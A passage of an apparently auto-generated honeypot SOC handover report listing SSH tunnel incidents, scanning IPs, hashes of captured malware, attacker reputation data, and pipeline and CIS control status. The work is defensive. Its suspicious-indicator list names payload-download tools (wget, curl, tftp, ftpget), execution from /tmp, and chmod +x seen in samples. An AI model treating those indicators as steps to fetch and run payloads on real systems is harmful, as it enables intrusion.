| `2026-08-23 04:51:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 04:51:17` | `cowrie.direct-tcpip.data` |
| `2026-08-23 04:51:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c7072fabb3f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 04:51 |
| **Last Seen** | 2026-08-23 04:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:51:18` | `cowrie.session.connect` |
| `2026-08-23 04:51:18` | `cowrie.client.version` |
| `2026-08-23 04:51:18` | `cowrie.client.kex` |
| `2026-08-23 04:51:19` | `cowrie.login.success` |
| `2026-08-23 04:51:20` | `cowrie.direct-tcpip.request` |
| `2026-08-23 04:51:20` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 04:51:20` | `cowrie.direct-tcpip.data` |
| `2026-08-23 04:51:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **5** | 2026-08-23 03:08 | 2026-08-23 04:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `170.80.242[.]75` | **3** | 2026-08-23 03:32 | 2026-08-23 03:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]32` | **3** | 2026-08-23 03:06 | 2026-08-23 03:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]105` | **3** | 2026-08-23 03:06 | 2026-08-23 03:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]86` | **3** | 2026-08-23 03:05 | 2026-08-23 03:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `76.33.238[.]141` | **3** | 2026-08-23 03:13 | 2026-08-23 03:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `182.92.236[.]135` | **2** | 2026-08-23 04:15 | 2026-08-23 04:17 | 2m | 0 | `T1592` | 🟢 LOW |
| `91.210.200[.]133` | **2** | 2026-08-23 04:08 | 2026-08-23 04:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `112.51.27[.]82` | 1 | 2026-08-23 03:15 | 2026-08-23 03:16 | 57s | 0 | `T1592` | 🟢 LOW |
| `114.35.41[.]88` | 1 | 2026-08-23 04:37 | 2026-08-23 04:37 | 11s | 0 | `T1592` | 🟢 LOW |
| `157.0.0[.]10` | 1 | 2026-08-23 04:39 | 2026-08-23 04:40 | 30s | 0 | `T1592` | 🟢 LOW |
| `173.255.221[.]189` | 1 | 2026-08-23 03:50 | 2026-08-23 03:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `189.90.216[.]245` | 1 | 2026-08-23 02:55 | 2026-08-23 02:55 | 10s | 0 | `T1592` | 🟢 LOW |
| `200.59.88[.]204` | 1 | 2026-08-23 04:52 | 2026-08-23 04:52 | 10s | 0 | `T1592` | 🟢 LOW |
| `45.205.1[.]247` | 1 | 2026-08-23 03:44 | 2026-08-23 03:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]25` | 1 | 2026-08-23 03:57 | 2026-08-23 03:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]7` | 1 | 2026-08-23 04:29 | 2026-08-23 04:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `59.44.229[.]3` | 1 | 2026-08-23 03:22 | 2026-08-23 03:22 | 11s | 0 | `T1592` | 🟢 LOW |
| `81.233.137[.]32` | 1 | 2026-08-23 03:38 | 2026-08-23 03:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `81.236.211[.]54` | 1 | 2026-08-23 03:56 | 2026-08-23 03:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]183` | 1 | 2026-08-23 02:55 | 2026-08-23 02:55 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `81.233.137[.]32` | SE | Telia Network Services | **100** ⚠️ | 2 |
| `69.124.69[.]20` | US | Optimum Online (Cablevision Systems) | **100** ⚠️ | 1 |
| `200.59.88[.]204` | AR | Sinectis S.A. | **100** ⚠️ | 2 |
| `178.178.222[.]59` | RU | PJSC MegaFon | **100** ⚠️ | 50 |
| `200.199.32[.]174` | BR | V tal | **100** ⚠️ | 50 |
| `170.80.242[.]75` | MX | TV CABLE DEL GUADIANA S.A DE C.V. | **100** ⚠️ | 0 |
| `189.51.96[.]70` | BR | RapeedoISP LTDA | **100** ⚠️ | 3 |
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |
| `173.255.221[.]189` | US | Linode | **100** ⚠️ | 50 |
| `61.93.135[.]225` | HK | Hong Kong Broadband Network Ltd | **100** ⚠️ | 1 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 73 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 64 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 1 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 1 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |

---

## 🔕 False Positive Summary (21 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 13 below threshold 25 | 2 |
| AbuseIPDB score 17 below threshold 25 | 2 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 12 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 122 cases |
| Tool 34  | Credential Extractor        | ✅ 84 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 71 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 21 filtered (17.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 57 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 17 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 64 priority case(s) shown individually · 21 recon entry/entries in table (8 group(s) consolidating 24 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-23T06:48:50Z_
